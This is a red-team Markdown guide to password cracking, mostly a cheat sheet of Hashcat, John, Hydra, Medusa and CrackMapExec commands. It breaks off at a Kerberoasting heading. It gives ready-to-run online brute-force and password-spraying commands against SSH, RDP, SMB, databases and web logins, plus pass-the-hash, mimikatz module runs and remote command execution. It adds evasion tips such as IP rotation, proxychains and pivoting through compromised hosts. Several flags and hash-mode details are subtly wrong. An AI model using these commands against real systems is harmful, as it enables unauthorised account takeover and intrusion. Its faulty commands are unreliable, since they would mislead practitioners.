---
tags:
  - redteam
  - password-cracking
  - bruteforce
  - hashcat
  - john
  - hydra
  - kali
  - guide
created: 2026-05-03
author: clawd
version: v1.0
---

# Password Cracking Guide 🔓

> [!danger] Legal Warning
> This guide is for **authorized penetration testing, red team operations, and security research only**. Unauthorized password cracking is illegal. Always obtain written permission before testing.

---

## Table of Contents

1. [Overview](#overview)
2. [Password Hash Types](#password-hash-types)
3. [Wordlists & Rules](#wordlists--rules)
4. [Hashcat (GPU Cracking)](#hashcat-gpu-cracking)
5. [John the Ripper (CPU Cracking)](#john-the-ripper-cpu-cracking)
6. [Hydra (Online Bruteforce)](#hydra-online-bruteforce)
7. [CrackMapExec (Network Auth)](#crackmapexec-network-auth)
8. [Medusa (Parallel Online Cracking)](#medusa-parallel-online-cracking)
9. [Hash Identification](#hash-identification)
10. [Custom Wordlist Generation](#custom-wordlist-generation)
11. [Distributed Cracking](#distributed-cracking)
12. [OPSEC Considerations](#opsec-considerations)
13. [Quick Reference Cheat Sheet](#quick-reference-cheat-sheet)

---

## Overview

Password cracking is a critical skill for red team operations. This guide covers:

- **Offline cracking**: Hashcat, John the Ripper (cracking captured hashes)
- **Online cracking**: Hydra, Medusa, CrackMapExec (attacking live services)
- **Wordlists**: rockyou.txt, custom generation, rule-based attacks
- **Hash types**: NTLM, MD5, SHA, bcrypt, WPA, etc.

### Cracking Workflow

```
┌─────────────────────────────────────────────────────────────────┐
│                    PASSWORD CRACKING WORKFLOW                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. CAPTURE                                                     │
│     ├── Network sniffing (responder, impacket)                 │
│     ├── Database dump (users table)                             │
│     ├── Memory dump (mimikatz, secretsdump)                     │
│     └── File extraction (/etc/shadow, SAM database)             │
│                                                                  │
│  2. IDENTIFY                                                    │
│     ├── hash-identifier                                         │
│     ├── hashid                                                  │
│     └── John --format=help                                      │
│                                                                  │
│  3. PREPARE                                                     │
│     ├── Select wordlist (rockyou, custom, targeted)             │
│     ├── Apply rules (best64, OneRuleToRuleThemAll)              │
│     └── Format hashes (hashcat format)                          │
│                                                                  │
│  4. CRACK                                                       │
│     ├── Dictionary attack (fast, low success)                   │
│     ├── Rule-based attack (medium speed, medium success)        │
│     ├── Mask attack (slow, high success for known patterns)     │
│     └── Hybrid attack (dictionary + mask)                       │
│                                                                  │
│  5. POST-PROCESS                                                │
│     ├── Validate cracked passwords                              │
│     ├── Reuse for lateral movement                              │
│     └── Document for report                                     │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Password Hash Types

Understanding hash types is critical for selecting the right cracking approach.

### Common Hash Types

| Hash Type | Example | Hashcat Mode | John Format | Common Use |
|-----------|---------|--------------|-------------|------------|
| **MD5** | `5f4dcc3b5aa765d61d8327deb882cf99` | `-m 0` | `raw-md5` | Web apps, legacy systems |
| **SHA1** | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` | `-m 100` | `raw-sha1` | Git, older Linux |
| **SHA256** | `5e884898da28047d...` | `-m 1400` | `raw-sha256` | Modern web apps |
| **SHA512** | `b109f3bb...` | `-m 1700` | `raw-sha512` | Modern Linux (/etc/shadow) |
| **NTLM** | `8846f7eaee8fb117ad06bdd830b7586c` | `-m 1000` | `nt` | Windows (AD, SAM) |
| **NTLMv1** | `aad3b435b51404ee...` | `-m 5500` | `netntlm` | Windows challenge/response |
| **NTLMv2** | `aad3b435b51404ee...` | `-m 5600` | `netntlmv2` | Windows challenge/response |
| **bcrypt** | `$2a$10$N9qo8uLOickgx2ZMRZoMye...` | `-m 3200` | `bcrypt` | Modern web apps, BSD |
| **WPA/WPA2** | Handshake capture | `-m 2500` | `wpapsk` | WiFi networks |
| **Kerberos TGT** | `aes256-cts-hmac-sha1-96` | `-m 19600` | `krb5tgs` | Active Directory |
| **Kerberos TGS** | `aes256-cts-hmac-sha1-96` | `-m 19700` | `krb5tgs` | Active Directory |
| **SSH (OpenSSH)** | `$ssh-ng$...` | `-m 22911` | `ssh` | SSH private keys |
| **7-Zip** | `$7z$2$...` | `-m 11600` | `7z` | Encrypted archives |
| **PDF** | `$pdf$...` | `-m 10400` | `pdf` | Encrypted PDFs |
| **ZIP** | `$zip2$...` | `-m 13600` | `zip` | Encrypted ZIPs |

### Hash Examples

```bash
# MD5 (hash: "password")
echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt

# NTLM (hash: "password")
echo "8846f7eaee8fb117ad06bdd830b7586c" > hash.txt

# SHA512crypt (Linux /etc/shadow format)
echo 'user:$6$rounds=5000$salt$hashedvalue:18000:0:99999:7:::' > shadow.txt

# Kerberos TGT (AS-REP hash)
echo '$krb5asrep$23$user@DOMAIN:hash...' > hash.txt
```

---

## Wordlists & Rules

### Essential Wordlists

**Pre-installed on Kali:**

```bash
# RockYou (the classic - 14M passwords)
/usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

# SecLists (comprehensive collection)
/usr/share/seclists/Passwords/
├── xato-net-10-million-passwords.txt
├── xato-net-10-million-passwords-1000000.txt
├── xato-net-10-million-passwords-10000.txt
├── xato-net-10-million-passwords-1000.txt
├── darkweb2017-top100.txt
├── darkweb2017-top1000.txt
└── common-passwords.txt

# Common wordlists
/usr/share/wordlists/
├── fern-wifi/common.txt
├── wifite/
└── nmap.lst
```

**Download Additional Wordlists:**

```bash
# SecLists (if not installed)
$ git clone --depth 1 https://github.com/danielmiessler/SecLists /usr/share/seclists

# RockYou (if missing)
$ wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Probable Wordlists
$ git clone https://github.com/berzerk0/ProbableWordlists /opt/probable-wordlists

# Custom targeted wordlist (from OSINT)
$ cat company_names.txt employees.txt products.txt | sort -u > target-wordlist.txt
```

### Rule-Based Attacks

Rules transform base words (e.g., "password" → "Password123!", "p@ssw0rd").

**Hashcat Rule Files:**

```bash
# Built-in rules (in /usr/share/hashcat/rules/)
ls /usr/share/hashcat/rules/
# best64.rule        - Best 64 rules (fast, effective)
# OneRuleToRuleThemAll.rule
# InsidePro-PasswordsPro.rule
# T0XlC.rule
# dive.rule
# mangling.rule

# Use best64 (recommended starting point)
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Use multiple rule files
hashcat -m 1000 hash.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule
```

**John the Ripper Rules:**

```bash
# John rules (in /etc/john/)
ls /etc/john/*.rules
# jumbo.rules       - Comprehensive rules
# best.rules        - Best ruleset
# single.rules      - Single mode rules

# Use rules with John
john --wordlist=/usr/share/wordlists/rockyou.txt \
     --rules=Best64 \
     --format=nt hash.txt
```

**Generate Custom Rules:**

```bash
# Create custom rule (add "123" to end of each word)
echo '$1 $2 $3 $4 $5 $6 $7 $8 $9 c A "123"' > custom.rule

# Test rule
hashcat --stdout -r custom.rule <(echo "password")
# Output: password123

# More complex: capitalize first, add year, special char
echo '$1 $2 $3 $4 $5 $6 $7 $8 $9 c C "2024" s p "@"' > advanced.rule
```

---

## Hashcat (GPU Cracking) 🚀

Hashcat is the world's fastest password cracker, leveraging GPU acceleration.

### Installation & Setup

```bash
# Already installed on Kali
hashcat --version

# Check GPU detection
hashcat -I

# Benchmark your GPU
hashcat -b
```

### Basic Cracking

```bash
# Dictionary attack (NTLM hash)
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules (NTLM)
hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 1000 -a 0 --show hash.txt

# Export cracked passwords
hashcat -m 1000 -a 0 --show hash.txt > cracked.txt

# Remove cracked hashes from list
hashcat -m 1000 -a 0 --remove hash.txt
```

### Attack Modes

```bash
# -a 0: Dictionary (straight)
hashcat -m 1000 -a 0 hash.txt rockyou.txt

# -a 1: Combinator (word1 + word2)
hashcat -m 1000 -a 1 hash.txt rockyou.txt rockyou.txt

# -a 3: Mask (bruteforce with pattern)
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?l?l?l?l
hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?l?l?d?d  # Password12

# -a 6: Hybrid Wordlist + Mask (dictionary + suffix)
hashcat -m 1000 -a 6 hash.txt rockyou.txt ?d?d?d?d  # password + 4 digits

# -a 7: Hybrid Mask + Wordlist (prefix + dictionary)
hashcat -m 1000 -a 7 hash.txt ?d?d?d?d rockyou.txt  # 4 digits + password
```

### Mask Examples

```bash
# All 8-character lowercase passwords
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?l?l?l?l

# Password + 2 digits (e.g., "password12")
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?l?l?l?l?d?d

# Uppercase + 6 lowercase + 2 digits (e.g., "Password12")
hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?l?l?l?d?d

# Custom charset (only vowels and digits)
hashcat -m 1000 -a 3 hash.txt -1 aeiou0123456789 ?1?1?1?1?1?1

# Incremental bruteforce (1-8 chars, all lowercase)
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?l?l?l?l --increment --increment-min 1 --increment-max 8
```

### Advanced Hashcat

```bash
# Cracking multiple hashes at once
hashcat -m 1000 -a 0 hashes.txt rockyou.txt

# Limit to specific hash types
hashcat -m 1000 -a 0 hash*.txt rockyou.txt

# Session management (pause/resume)
hashcat -m 1000 -a 0 hash.txt rockyou.txt --session mycrack
hashcat --session mycrack --pause
hashcat --session mycrack --resume

# Quit and save progress
hashcat --session mycrack --quit

# Temperature limit (prevent GPU overheating)
hashcat -m 1000 -a 0 hash.txt rockyou.txt --gpu-temp-abort 90 --gpu-temp-retain 75

# Force specific GPU
hashcat -m 1000 -a 0 hash.txt rockyou.txt -d 1  # Use GPU 1 only

# Distributed cracking (multiple GPUs/machines)
hashcat -m 1000 -a 0 hash.txt rockyou.txt --distributed

# Brain mode (distributed without server)
hashcat -m 1000 -a 0 hash.txt rockyou.txt --brain
```

### Hashcat Performance Tuning

```bash
# Increase workload (higher = faster but may crash)
hashcat -m 1000 -a 0 hash.txt rockyou.txt -w 4  # Workload profile: 1=low, 4=nightmare

# Increase GPU threads
hashcat -m 1000 -a 0 hash.txt rockyou.txt --gpu-accel 1000

# Disable CPU load (dedicate GPU only)
hashcat -m 1000 -a 0 hash.txt rockyou.txt --force

# Show real-time stats
watch -n 1 'hashcat --show --status'
```

### Hashcat Examples by Hash Type

```bash
# NTLM (Windows)
hashcat -m 1000 -a 0 nt_hashes.txt rockyou.txt

# MD5
hashcat -m 0 -a 0 md5_hashes.txt rockyou.txt

# SHA256
hashcat -m 1400 -a 0 sha256_hashes.txt rockyou.txt

# SHA512crypt (Linux /etc/shadow)
hashcat -m 1800 -a 0 shadow.txt rockyou.txt

# WPA/WPA2 handshake
hashcat -m 2500 -a 0 handshake.cap rockyou.txt

# Kerberos TGT (AS-REP)
hashcat -m 19600 -a 0 kerb_hashes.txt rockyou.txt

# 7-Zip encrypted archive
hashcat -m 11600 -a 0 archive.7z rockyou.txt

# PDF encrypted
hashcat -m 10400 -a 0 document.pdf rockyou.txt

# ZIP encrypted
hashcat -m 13600 -a 0 archive.zip rockyou.txt
```

---

## John the Ripper (CPU Cracking) 🧠

John the Ripper is versatile, supports more hash types than Hashcat, and works well on CPU.

### Installation & Setup

```bash
# Already installed on Kali
john --version

# John Jumbo (extended version)
git clone https://github.com/openwall/john /opt/john
cd /opt/john/src && ./configure && make
```

### Basic Cracking

```bash
# Dictionary attack
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Dictionary + rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Best64 hash.txt

# Show cracked passwords
john --show hash.txt

# Show cracked with format
john --show --format=nt hash.txt

# Remove cracked from list
john --pot-file=/dev/null --wordlist=rockyou.txt hash.txt
```

### Attack Modes

```bash
# Single mode (uses username as base word)
john --single hash.txt

# Wordlist mode
john --wordlist=rockyou.txt hash.txt

# Incremental mode (bruteforce)
john --incremental hash.txt

# Incremental with charset (custom pattern)
john --incremental=AlphaNum hash.txt

# External mode (custom cracking logic)
john --external=filter_wordlist hash.txt
```

### Rule Examples

```bash
# Use built-in rules
john --wordlist=rockyou.txt --rules=Best64 hash.txt
john --wordlist=rockyou.txt --rules=Jumbo hash.txt
john --wordlist=rockyou.txt --rules=OneRuleToRuleThemAll hash.txt

# Generate candidate passwords with rules
john --wordlist=rockyou.txt --rules=Best64 --stdout > generated_words.txt

# Custom rules file
john --wordlist=rockyou.txt --rules=myrules.hashcat hash.txt
```

### Format-Specific Cracking

```bash
# NTLM (Windows)
john --format=nt --wordlist=rockyou.txt nt_hashes.txt

# MD5
john --format=raw-MD5 --wordlist=rockyou.txt md5_hashes.txt

# SHA256
john --format=Raw-SHA256 --wordlist=rockyou.txt sha256.txt

# SHA512crypt (Linux shadow)
john --format=sha512crypt --wordlist=rockyou.txt shadow.txt

# bcrypt
john --format=bcrypt --wordlist=rockyou.txt bcrypt_hashes.txt

# WPA/WPA2
john --format=wpapsk --wordlist=rockyou.txt handshake.cap

# Kerberos
john --format=krb5tgs --wordlist=rockyou.txt kerb_hashes.txt

# SSH private key
john --format=ssh --wordlist=rockyou.txt id_rsa

# 7-Zip
john --format=7z --wordlist=rockyou.txt archive.7z

# PDF
john --format=pdf --wordlist=rockyou.txt document.pdf

# ZIP
john --format=zip --wordlist=rockyou.txt archive.zip
```

### John the Ripper Advanced Features

```bash
# Pot file (store cracked passwords)
john --pot-file=/path/to/pot hash.txt

# Session management
john --session=mycrack --wordlist=rockyou.txt hash.txt
john --session=mycrack --status
john --session=mycrack --restore

# Fork (multi-process)
john --fork=4 --wordlist=rockyou.txt hash.txt

# Wordlist manipulation
john --wordlist=rockyou.txt --rules --stdout > wordlist_rules.txt
john --wordlist=wordlist_rules.txt hash.txt

# Mask attack (similar to Hashcat)
john --mask=?l?l?l?l?l?l?l?l hash.txt
john --mask=?u?l?l?l?l?l?d?d hash.txt

# Generate candidate passwords
john --wordlist=rockyou.txt --rules=Best64 --stdout > candidates.txt
john --wordlist=candidates.txt hash.txt
```

### John vs Hashcat: When to Use Which

| Scenario | Use Hashcat | Use John |
|----------|-------------|----------|
| **Speed** | ✅ GPU acceleration | ❌ CPU only |
| **Hash types** | 300+ formats | 500+ formats |
| **Rule support** | Good | Excellent |
| **Distributed** | Yes (Brain mode) | Yes (MPI) |
| **Memory usage** | Low | Moderate |
| **Ease of use** | Moderate | Easy |
| **Best for** | NTLM, MD5, SHA | bcrypt, scrypt, exotic |

---

## Hydra (Online Bruteforce) 🌊

Hydra performs online password attacks against live services (SSH, FTP, HTTP, SMB, etc.).

### Installation & Setup

```bash
# Already installed on Kali
hydra -h | head -20

# Update
apt update && apt install hydra -y
```

### Basic Usage

```bash
# Syntax
hydra -L users.txt -P passwords.txt <protocol>://<target>:<port>/<path>

# Common protocols: ssh, ftp, http-get, http-post, smb, rdp, mysql, postgres
```

### SSH Bruteforce

```bash
# Single user, password list
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50

# User list, password list
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50

# With specific port
hydra -l admin -P rockyou.txt ssh://192.168.1.50:2222

# With verbose output
hydra -vV -l admin -P rockyou.txt ssh://192.168.1.50

# Limit attempts (avoid lockout)
hydra -l admin -P rockyou.txt -t 4 ssh://192.168.1.50  # 4 parallel tasks

# Save progress
hydra -l admin -P rockyou.txt -o results.txt ssh://192.168.1.50
```

### FTP Bruteforce

```bash
# Anonymous login check
hydra -l anonymous -P rockyou.txt ftp://192.168.1.50

# Specific user
hydra -l admin -P rockyou.txt ftp://192.168.1.50

# User list
hydra -L users.txt -P rockyou.txt ftp://192.168.1.50
```

### HTTP/HTTPS Bruteforce

```bash
# HTTP GET (form-based login)
hydra -L users.txt -P rockyou.txt http-get://192.168.1.50/login.php

# HTTP POST (form-based login)
# Format: "url:post_params:fail_string"
hydra -L users.txt -P rockyou.txt \
  http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed" \
  192.168.1.50

# With cookies
hydra -L users.txt -P rockyou.txt \
  http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" \
  192.168.1.50:H="Cookie: session=abc123"

# HTTPS
hydra -L users.txt -P rockyou.txt \
  https-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid" \
  192.168.1.50

# With specific success string
hydra -L users.txt -P rockyou.txt \
  http-post-form "/admin:log=^USER^&pwd=^PASS^:S=Welcome" \
  192.168.1.50
```

### SMB/Windows Bruteforce

```bash
# SMB (Windows file sharing)
hydra -L users.txt -P rockyou.txt smb://192.168.1.50

# SMB with specific share
hydra -l admin -P rockyou.txt smb://192.168.1.50/share

# RDP (Remote Desktop)
hydra -L users.txt -P rockyou.txt rdp://192.168.1.50

# With specific domain
hydra -L users.txt -P rockyou.txt rdp://192.168.1.50 -s 3389
```

### Database Bruteforce

```bash
# MySQL
hydra -L users.txt -P rockyou.txt mysql://192.168.1.50

# PostgreSQL
hydra -L users.txt -P rockyou.txt postgres://192.168.1.50

# MSSQL
hydra -L users.txt -P rockyou.txt mssql://192.168.1.50

# Oracle
hydra -L users.txt -P rockyou.txt oracle://192.168.1.50:1521/sid
```

### Other Protocols

```bash
# Telnet
hydra -L users.txt -P rockyou.txt telnet://192.168.1.50

# SMTP
hydra -L users.txt -P rockyou.txt smtp://192.168.1.50

# POP3
hydra -L users.txt -P rockyou.txt pop3://192.168.1.50

# IMAP
hydra -L users.txt -P rockyou.txt imap://192.168.1.50

# LDAP
hydra -L users.txt -P rockyou.txt ldap://192.168.1.50

# VNC
hydra -L users.txt -P rockyou.txt vnc://192.168.1.50

# SNMP
hydra -L users.txt -P rockyou.txt snmp://192.168.1.50
```

### Hydra Advanced Options

```bash
# Limit parallel connections (avoid detection/lockout)
hydra -L users.txt -P rockyou.txt -t 2 ssh://192.168.1.50

# Set timeout
hydra -L users.txt -P rockyou.txt -w 30 ssh://192.168.1.50

# Retry on failure
hydra -L users.txt -P rockyou.txt -r 3 ssh://192.168.1.50

# Stop after first valid credential
hydra -L users.txt -P rockyou.txt -f ssh://192.168.1.50

# Verbose output
hydra -L users.txt -P rockyou.txt -vV ssh://192.168.1.50

# Save results
hydra -L users.txt -P rockyou.txt -o results.txt ssh://192.168.1.50

# Resume from checkpoint
hydra -L users.txt -P rockyou.txt --restore ssh://192.168.1.50

# Use specific interface
hydra -L users.txt -P rockyou.txt -e ns ssh://192.168.1.50
# -e ns: try empty password, try username as password
```

### Hydra OPSEC Tips

```bash
# Slow down to avoid detection
hydra -L users.txt -P rockyou.txt -t 1 -w 60 ssh://192.168.1.50

# Random delay between attempts
hydra -L users.txt -P rockyou.txt --delay 1000 ssh://192.168.1.50

# Use common passwords first (quick wins)
hydra -L users.txt -P /usr/share/seclists/Passwords/common-passwords.txt ssh://192.168.1.50

# Try empty password and username as password
hydra -L users.txt -P rockyou.txt -e ns ssh://192.168.1.50
```

---

## CrackMapExec (Network Auth) 💥

CrackMapExec (CME) is designed for Active Directory/network pentesting with built-in credential testing.

### Installation & Setup

```bash
# Already installed on Kali
crackmapexec --version

# Update
crackmapexec --update
```

### SMB Password Spraying

```bash
# Single password against multiple users (password spray)
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123'

# Multiple passwords against multiple users
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

# Single user, multiple passwords
crackmapexec smb 192.168.1.50 -u admin -p passwords.txt

# With domain
crackmapexec smb 192.168.1.0/24 -d DOMAIN -u users.txt -p passwords.txt

# Continue on success (don't stop after first valid)
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue

# Output results
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt -o output.txt
```

### SMB with NTLM Hashes (Pass-the-Hash)

```bash
# Pass-the-hash attack
crackmapexec smb 192.168.1.0/24 -u users.txt -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'

# Multiple hashes
crackmapexec smb 192.168.1.0/24 -u users.txt -H hashes.txt

# Local admin check
crackmapexec smb 192.168.1.0/24 -u users.txt -H hashes.txt --local-auth
```

### Kerberos Attacks

```bash
# Kerberoasting (request TGS for service accounts)
crackmapexec ldap 192.168.1.50 -u users.txt -p passwords.txt --kerberoasting kerberoast_hashes.txt

# AS-REP roasting (users without pre-auth)
crackmapexec ldap 192.168.1.50 -u users.txt -p passwords.txt --asreproast asrep_hashes.txt

# Export TGT for use with other tools
crackmapexec smb 192.168.1.50 -u user -p pass --export-tgt user.ccache
```

### LDAP Enumeration + Credential Testing

```bash
# Enumerate users
crackmapexec ldap 192.168.1.50 -u users.txt -p passwords.txt --users

# Enumerate groups
crackmapexec ldap 192.168.1.50 -u users.txt -p passwords.txt --groups

# Enumerate computers
crackmapexec ldap 192.168.1.50 -u users.txt -p passwords.txt --computers

# Check for null sessions
crackmapexec smb 192.168.1.0/24 -u '' -p ''
```

### MSSQL Attacks

```bash
# MSSQL password spray
crackmapexec mssql 192.168.1.0/24 -u users.txt -p passwords.txt

# Execute command via MSSQL
crackmapexec mssql 192.168.1.50 -u sa -p 'password123' -x 'whoami'

# Enable xp_cmdshell
crackmapexec mssql 192.168.1.50 -u sa -p 'password123' --mssql-shell
```

### WinRM Attacks

```bash
# WinRM password spray
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Execute command via WinRM
crackmapexec winrm 192.168.1.50 -u admin -p 'password123' -x 'whoami'

# PowerShell execution
crackmapexec winrm 192.168.1.50 -u admin -p 'password123' -X 'Get-Process'
```

### RDP Attacks

```bash
# RDP password spray
crackmapexec rdp 192.168.1.0/24 -u users.txt -p passwords.txt

# With NLA (Network Level Authentication)
crackmapexec rdp 192.168.1.0/24 -u users.txt -p passwords.txt --nla
```

### CME Modules

```bash
# List available modules
crackmapexec smb --modules

# Run specific module
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt -M mimikatz

# Run module with options
crackmapexec smb 192.168.1.50 -u admin -p pass -M lsassy

# Custom module
crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt -M /path/to/module.py
```

---

## Medusa (Parallel Online Cracking) 🎯

Medusa is a fast, parallel network authentication cracker (alternative to Hydra).

### Installation & Setup

```bash
# Already installed on Kali
medusa -h | head -20
```

### Basic Usage

```bash
# Syntax
medusa -h <target> -u <user> -P <password_file> -M <module>

# Common modules: ssh, ftp, http, smbnt, mssql, mysql, rdp
```

### SSH Bruteforce

```bash
# Single user, password list
medusa -h 192.168.1.50 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh

# User list, password list
medusa -h 192.168.1.50 -U users.txt -P rockyou.txt -M ssh

# Multiple hosts
medusa -H hosts.txt -U users.txt -P rockyou.txt -M ssh

# With specific port
medusa -h 192.168.1.50 -u admin -P rockyou.txt -M ssh -n 2222
```

### SMB/NTLM Bruteforce

```bash
# SMB with NTLM hashes
medusa -h 192.168.1.50 -U users.txt -H hashes.txt -M smbnt

# SMB with passwords
medusa -h 192.168.1.50 -U users.txt -P rockyou.txt -M smbnt
```

### HTTP Bruteforce

```bash
# HTTP GET
medusa -h 192.168.1.50 -u admin -P rockyou.txt -M http -m uri=/login.php

# HTTP POST
medusa -h 192.168.1.50 -u admin -P rockyou.txt -M http -m uri=/login.php,method=POST,body="user=^USER^&pass=^PASS^",failstring="Login failed"
```

### Medusa Advanced Options

```bash
# Parallel threads (default: 1)
medusa -h 192.168.1.50 -u admin -P rockyou.txt -M ssh -t 4

# Verbose output
medusa -h 192.168.1.50 -u admin -P rockyou.txt -M ssh -v 6

# Save results
medusa -h 192.168.1.50 -u admin -P rockyou.txt -M ssh -o results.txt

# Continue on success
medusa -h 192.168.1.50 -u admin -P rockyou.txt -M ssh -F

# Specific module options
medusa -h 192.168.1.50 -u admin -P rockyou.txt -M mysql -m port=3306
```

---

## Hash Identification 🔍

Before cracking, identify the hash type.

### hash-identifier

```bash
# Interactive hash identification
hash-identifier

# Paste hash, get possible types
echo "5f4dcc3b5aa765d61d8327deb882cf99" | hash-identifier
```

### hashid

```bash
# Identify single hash
hashid 5f4dcc3b5aa765d61d8327deb882cf99

# Identify from file
hashid -m hash.txt

# Show hashcat mode
hashid -m hash.txt

# Show John format
hashid -j hash.txt
```

### John the Ripper

```bash
# Let John auto-detect
john --format=help hash.txt

# Show supported formats
john --list=formats
```

### Online Tools

- https://hashes.com/en/tools/hash_identifier
- https://www.onlinehashcrack.com/hash-identification.php

---

## Custom Wordlist Generation 📝

### Crunch (Generate Custom Wordlists)

```bash
# Install
apt install crunch -y

# Generate all 6-character lowercase passwords
crunch 6 6 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Generate 8-character alphanumeric
crunch 8 8 0123456789abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# Generate with pattern (start with "Pass", end with 4 digits)
crunch 8 8 -t Pass@@@@ -o wordlist.txt
# @ = lowercase, ^ = uppercase, % = digit, , = special

# Generate permutations of specific words
crunch 4 4 -p password admin root user -o wordlist.txt

# Generate with charset file
crunch 8 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o wordlist.txt
```

### CeWL (Custom Wordlist from Website)

```bash
# Scrape website for words
cewl -d 2 -m 5 -w wordlist.txt https://target.com

# With email addresses
cewl -d 3 -m 6 -w wordlist.txt --email https://target.com

# Include numbers
cewl -d 2 -m 5 -w wordlist.txt --with-numbers https://target.com

# Verbose output
cewl -v -d 3 -m 5 -w wordlist.txt https://target.com
```

### Mentalist (GUI Wordlist Generator)

```bash
# Launch GUI
mentalist

# Create rules visually, export wordlist
```

### Pydictor (Advanced Wordlist Generator)

```bash
# Install
git clone https://github.com/LandGrey/pydictor
cd pydictor && ./pydictor.py

# Generate base wordlist
./pydictor.py -base

# Generate with combinator
./pydictor.py -comb

# Generate with magic mode (pre-built patterns)
./pydictor.py -magic
```

### Wordlist Manipulation

```bash
# Remove duplicates
sort wordlist.txt | uniq -u > wordlist_unique.txt

# Remove words shorter than 8 chars
awk 'length >= 8' wordlist.txt > wordlist_8plus.txt

# Remove words longer than 15 chars
awk 'length <= 15' wordlist.txt > wordlist_short.txt

# Add numbers to end of each word
sed 's/$/123/' wordlist.txt > wordlist_num.txt

# Capitalize first letter
sed 's/\b\(.\)/\u\1/g' wordlist.txt > wordlist_cap.txt

# Combine multiple wordlists
cat rockyou.txt custom.txt company.txt | sort -u > combined.txt

# Filter by pattern (only words with numbers)
grep '[0-9]' wordlist.txt > wordlist_with_nums.txt
```

---

## Distributed Cracking 🖥️

### Hashcat Brain Mode

```bash
# Server (coordinator)
hashcat --brain-server -p brain_password

# Client 1
hashcat -m 1000 -a 0 hash.txt rockyou.txt --brain --brain-host server_ip --brain-password brain_password

# Client 2
hashcat -m 1000 -a 0 hash.txt rockyou.txt --brain --brain-host server_ip --brain-password brain_password
```

### Hashtopolis

```bash
# Install server
git clone https://github.com/s3inlc/hashtopolis
cd hashtopolis && ./install.sh

# Access web interface
# http://localhost:8080

# Configure agents, upload hashes, distribute cracking jobs
```

### Distributed John

```bash
# Use MPI for distributed John
mpirun -n 4 john --fork=4 --wordlist=rockyou.txt hash.txt
```

---

## OPSEC Considerations ⚠️

### Online Cracking OPSEC

| Risk | Mitigation |
|------|------------|
| **Account lockout** | Use password spraying (1 pass, many users), limit attempts |
| **Detection by IDS** | Slow down (-t 1, --delay), use proxy chains |
| **Logging on target** | Use common passwords first, avoid suspicious patterns |
| **IP blocking** | Rotate source IPs, use proxychains, pivot through compromised hosts |

```bash
# OPSEC-friendly password spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --delay 1000

# Slow Hydra scan
hydra -L users.txt -P rockyou.txt -t 1 -w 60 --delay 1000 ssh://192.168.1.50

# Use proxychains for online cracking
proxychains hydra -L users.txt -P rockyou.txt ssh://192.168.1.50
```

### Offline Cracking OPSEC

| Risk | Mitigation |
|------|------------|
| **GPU detection** | Run in VM, use cloud GPUs |
| **Power consumption spike** | Schedule during off-hours |
| **Network traffic to hash databases** | Use offline wordlists only |
| **Cracked password reuse** | Document, don't reuse on same engagement |

---

## Quick Reference Cheat Sheet 📋

### Hashcat Quick Commands

```bash
# NTLM dictionary
hashcat -m 1000 -a 0 hash.txt rockyou.txt

# NTLM + rules
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# NTLM mask (8 chars, lowercase + 2 digits)
hashcat -m 1000 -a 3 hash.txt ?l?l?l?l?l?l?d?d

# Show cracked
hashcat -m 1000 --show hash.txt

# Remove cracked
hashcat -m 1000 --remove hash.txt
```

### John Quick Commands

```bash
# NTLM dictionary
john --format=nt --wordlist=rockyou.txt hash.txt

# NTLM + rules
john --format=nt --wordlist=rockyou.txt --rules=Best64 hash.txt

# Show cracked
john --show hash.txt

# Generate candidates
john --wordlist=rockyou.txt --rules=Best64 --stdout > candidates.txt
```

### Hydra Quick Commands

```bash
# SSH
hydra -l admin -P rockyou.txt ssh://192.168.1.50

# HTTP POST
hydra -L users.txt -P rockyou.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=failed" 192.168.1.50

# SMB
hydra -L users.txt -P rockyou.txt smb://192.168.1.50
```

### CrackMapExec Quick Commands

```bash
# SMB spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123'

# Pass-the-hash
crackmapexec smb 192.168.1.0/24 -u users.txt -H 'aad3b435b51404ee:HASH'

# Kerberoast
